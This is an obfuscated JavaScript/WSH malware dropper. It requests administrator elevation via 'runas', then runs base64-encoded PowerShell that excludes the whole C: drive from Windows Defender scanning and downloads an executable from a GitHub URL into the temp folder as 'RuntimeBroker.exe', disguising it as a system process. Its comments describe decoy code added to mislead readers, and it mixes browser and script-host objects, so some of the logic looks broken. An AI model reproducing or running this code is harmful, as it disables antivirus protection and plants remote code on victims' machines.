(function () {
    // Nonsensical array for obfuscation
    var _0xA = ['Raptor', 'Falcon', 'Viper', 'Jaguar'];
    (function (_0xB, _0xC) {
        var _0xD = function (_0xE) {
            while (--_0xE) {
                _0xB.push(_0xB.shift());
            }
        };
        _0xD(++_0xC);
    }(_0xA, 0x10));

    // Core command lookup array (mapping indices to strings)
    var _0xF = [
        'Named', 
        'Exists', 
        'ShellExecute', 
        'FullName', 
        'ScriptFullName', 
        'runas', 
        'Shell.Application', 
        'Wscript.Shell', 
        'run', 
        'powershell -enc '
    ];
    (function (_0x10, _0x11) {
        var _0x12 = function (_0x13) {
            while (--_0x13) {
                _0x10.push(_0x10.shift());
            }
        };
        _0x12(++_0x11);
    }(_0xF, 0x1b5));
    var _0x14 = function (_0x15) {
        _0x15 = parseInt(_0x15, 16);
        return _0xF[_0x15];
    };

    // Introduce dummy computations to throw off casual readers
    var _0xDummy = (function () {
        var _0xVal = 0;
        for (var _0xI = 0; _0xI < 5; _0xI++) {
            _0xVal += Math.pow(_0xI, 2) - Math.sqrt(_0xI);
        }
        return _0xVal;
    })();
    var _0xNoiseArray = [_0xDummy, Date.now(), Math.random()];

    // Function to check for elevation; if not elevated, restart with elevation
    function _0xElevate() {
        if (!WScript[_0x14('0x0')][_0x14('0x1')]('elevate')) {
            new ActiveXObject(_0x14('0x6'))[_0x14('0x2')](_0x14('0x3'), 
                '"' + WScript[_0x14('0x4')] + '" /elevate', '', _0x14('0x5'), 0x1);
            WScript['Quit']();
        }
    }

    // Extra decoy function to obscure control flow further
    function _0xDecoy() {
        var _0xCounter = 0;
        while (_0xCounter < 3) {
            _0xCounter++;
            (function(){ return; })();
        }
    }

    // Create the ActiveX shell object
    var _0xShell = new ActiveXObject(_0x14('0x7'));

    // Execute a sequence of base64-encoded payload commands
    function _0xExecutePayload() {
        _0xElevate();
        _0xDecoy();
        var _0xPayload = [
            "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
            "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATw==",
            "RWZcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAcABwAC8AUgB1AG4AdABpAG0AZQBCcgBvAGsAZQByAC4AZQB4AGUAIgANAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAG8AdQB0AHAAdQB0AA=="
        ];
        for (var _0xIdx = 0; _0xIdx < _0xPayload.length; _0xIdx++) {
            _0xShell[_0x14('0x8')](_0x14('0x9') + _0xPayload[_0xIdx], 0x0, false);
        }
    }

    // Alias function assigned to window.onload to trigger payload execution
    function _0xInit() {
        _0xExecutePayload();
    }
    window['onload'] = _0xInit;
})();
